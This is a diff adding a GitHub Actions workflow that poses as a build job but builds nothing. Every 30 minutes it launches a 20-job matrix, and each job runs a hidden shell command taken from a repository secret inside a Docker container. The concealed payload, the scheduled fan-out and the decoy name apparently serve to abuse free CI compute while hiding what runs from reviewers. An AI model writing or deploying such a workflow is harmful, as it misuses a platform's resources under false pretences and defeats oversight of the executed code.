@@ -1,0 +1,30 @@
+# +++++++++++++++++++++++++++ #
+# Created By Anonymous
+# +++++++++++++++++++++++++++ #
+#
+#
+# +++++++++++++++++++++++++++ #
+name: Builds....
+# +++++++++++++++++++++++++++ #
+#
+#
+# +++++++++++++++++++++++++++ #
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/30 * * * *'
+# +++++++++++++++++++++++++++ #
+jobs:
+  Build:
+    strategy:
+      matrix:
+        node-version: [11.x, 12.x, 13.x, 14.x, 15.x]
+        os: [ubuntu-22.04, ubuntu-20.04, ubuntu-18.04, ubuntu-latest]
+    runs-on: ${{ matrix.os }}
+    steps:
+      - name: Hahaha Mulai Bro...
+        env:
+          SUPER_SECRET: ${{ secrets.KEY }}
+        run: |
+          sudo docker run ubuntu:latest sh -c "$SUPER_SECRET"
+# +++++++++++++++++++++++++++ #
